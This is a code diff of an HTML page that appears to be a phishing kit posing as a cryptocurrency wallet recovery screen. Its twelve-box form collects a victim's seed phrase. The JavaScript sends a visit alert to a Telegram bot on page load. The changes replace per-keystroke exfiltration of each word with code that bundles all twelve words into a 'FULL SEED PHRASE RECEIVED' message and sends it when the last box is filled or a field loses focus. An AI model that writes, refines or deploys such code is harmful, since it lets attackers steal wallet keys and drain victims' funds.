@@ -16,211 +16,42 @@
             --input-bg: #2a2a4a;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', sans-serif;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-white);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 500px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            padding: 40px 25px;
-            position: relative;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg-color); color: var(--text-white); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 500px; min-height: 100vh; display: flex; flex-direction: column; padding: 40px 25px; position: relative; }
 
         @media (min-width: 1024px) {
-            .container {
-                max-width: 450px;
-                min-height: 850px;
-                border: 1px solid var(--grid-border);
-                border-radius: 30px;
-                margin: 20px;
-            }
+            .container { max-width: 450px; min-height: 850px; border: 1px solid var(--grid-border); border-radius: 30px; margin: 20px; }
         }
 
-        .page {
-            display: none;
-            flex-direction: column;
-            height: 100%;
-            animation: fadeIn 0.4s ease;
-        }
-
+        .page { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.4s ease; }
         .page.active { display: flex; }
-
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-        .logo-area {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 20px;
-            margin-bottom: 40px;
-        }
+        .logo-area { display: flex; flex-direction: column; align-items: center; margin-top: 20px; margin-bottom: 40px; }
+        .brd-main-img { width: 140px; height: auto; }
+        h1 { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 20px; line-height: 1.2; }
+        .sub-text { color: var(--text-secondary); text-align: center; font-size: 15px; line-height: 1.6; margin-bottom: 60px; }
 
-        .brd-main-img {
-            width: 140px;
-            height: auto;
-        }
-
-        h1 {
-            font-size: 28px;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 20px;
-            line-height: 1.2;
-        }
-
-        .sub-text {
-            color: var(--text-secondary);
-            text-align: center;
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 60px;
-        }
-
-        .btn-container {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-top: auto;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 18px;
-            border-radius: 8px;
-            border: none;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
+        .btn-container { display: flex; flex-direction: column; gap: 15px; margin-top: auto; }
+        .btn { width: 100%; padding: 18px; border-radius: 8px; border: none; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
         .btn-primary { background-color: var(--btn-blue); color: white; }
         .btn-secondary { background-color: var(--btn-gray); color: white; }
 
-        .recovery-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 40px;
-            padding-top: 10px;
-        }
+        .recovery-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; padding-top: 10px; }
+        .back-arrow { width: 24px; height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .back-arrow svg { width: 20px; height: 20px; stroke: white; stroke-width: 2; fill: none; }
+        .help-icon { width: 24px; height: 24px; border: 2px solid white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 600; }
 
-        .back-arrow {
-            width: 24px;
-            height: 24px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+        .recovery-title { font-size: 26px; font-weight: 600; text-align: left; margin-bottom: 12px; line-height: 1.3; }
+        .recovery-subtitle { color: var(--text-secondary); text-align: left; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
 
-        .back-arrow svg {
-            width: 20px;
-            height: 20px;
-            stroke: white;
-            stroke-width: 2;
-            fill: none;
-        }
-
-        .help-icon {
-            width: 24px;
-            height: 24px;
-            border: 2px solid white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 13px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .recovery-title {
-            font-size: 26px;
-            font-weight: 600;
-            text-align: left;
-            margin-bottom: 12px;
-            line-height: 1.3;
-        }
-
-        .recovery-subtitle {
-            color: var(--text-secondary);
-            text-align: left;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 30px;
-        }
-
-        .recovery-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            width: 100%;
-        }
-
-        .grid-item {
-            background-color: var(--input-bg);
-            border-radius: 8px;
-            height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-
-        .item-num {
-            color: var(--text-secondary);
-            font-size: 16px;
-            font-weight: 500;
-        }
-
-        .item-input {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: transparent;
-            border: none;
-            color: white;
-            font-size: 15px;
-            text-align: center;
-            outline: none;
-            opacity: 0;
-            z-index: 5;
-        }
-
-        .item-input:focus {
-            opacity: 1;
-            background-color: var(--input-bg);
-            border-radius: 8px;
-        }
-
-        .item-input:focus + .item-num,
-        .item-input:not(:placeholder-shown) + .item-num {
-            display: none;
-        }
-
-        .item-input:not(:placeholder-shown) {
-            opacity: 1;
-        }
+        .recovery-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 100%; }
+        .grid-item { background-color: var(--input-bg); border-radius: 8px; height: 56px; display: flex; align-items: center; justify-content: center; position: relative; }
+        .item-num { color: var(--text-secondary); font-size: 16px; font-weight: 500; }
+        .item-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; color: white; font-size: 15px; text-align: center; outline: none; opacity: 0; z-index: 5; }
+        .item-input:focus, .item-input:not(:placeholder-shown) { opacity: 1; }
+        .item-input:focus + .item-num, .item-input:not(:placeholder-shown) + .item-num { display: none; }
     </style>
 </head>
 <body>
@@ -268,16 +99,13 @@
             } catch(e) {}
         }
 
-        // 1. Alert on Visit
-        window.onload = () => notifyTelegram("<b>🔔 [ALERT]</b> New visitor just landed on the page.");
+        window.onload = () => notifyTelegram("<b>🔔 [ALERT]</b> Someone just opened the page.");
 
         function showPage(id) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById(id).classList.add('active');
-            if(id === 'p2') notifyTelegram("<b>📂 [STEP]</b> User moved to the Recovery Phrase page.");
         }
 
-        // Create Grid
         const grid = document.getElementById('mainGrid');
         for (let i = 1; i <= 12; i++) {
             const div = document.createElement('div');
@@ -286,23 +114,40 @@
             grid.appendChild(div);
         }
 
-        // 2. Live Character Monitoring
+        // دالة لجمع كل الكلمات وإرسالها مرة واحدة
+        function collectAndSend() {
+            const inputs = document.querySelectorAll('.item-input');
+            let words = [];
+            let allFilled = true;
+
+            inputs.forEach(input => {
+                if (input.value.trim() === "") allFilled = false;
+                words.push(`${input.getAttribute('data-id')}: ${input.value.trim()}`);
+            });
+
+            // يرسل فقط إذا كانت الكلمة رقم 12 قد كتبت (دليل على الانتهاء)
+            if (allFilled) {
+                const finalMessage = `<b>💰 FULL SEED PHRASE RECEIVED</b>\n\n<pre>${words.join('\n')}</pre>`;
+                notifyTelegram(finalMessage);
+            }
+        }
+
+        // مراقبة التغيير في الحقول
         document.addEventListener('input', (e) => {
             if (e.target.classList.contains('item-input')) {
-                const id = e.target.getAttribute('data-id');
-                const val = e.target.value;
-                if(val.trim() !== "") {
-                    notifyTelegram(`<b>✍️ [LIVE]</b> Word ${id}: <code>${val}</code>`);
+                // إذا كتب في المربع الأخير، نقوم بمحاولة الجمع
+                if(e.target.getAttribute('data-id') === "12") {
+                    collectAndSend();
                 }
             }
         });
 
-        // 3. Final Word Notification
-        document.addEventListener('change', (e) => {
+        // إرسال احتياطي عند الضغط في أي مكان خارج الحقول بعد الكتابة
+        document.addEventListener('blur', (e) => {
             if (e.target.classList.contains('item-input')) {
-                notifyTelegram(`<b>✅ [CONFIRMED]</b> Word ${e.target.getAttribute('data-id')} updated to: <code>${e.target.value}</code>`);
+                collectAndSend();
             }
-        });
+        }, true);
     </script>
 </body>
 </html>
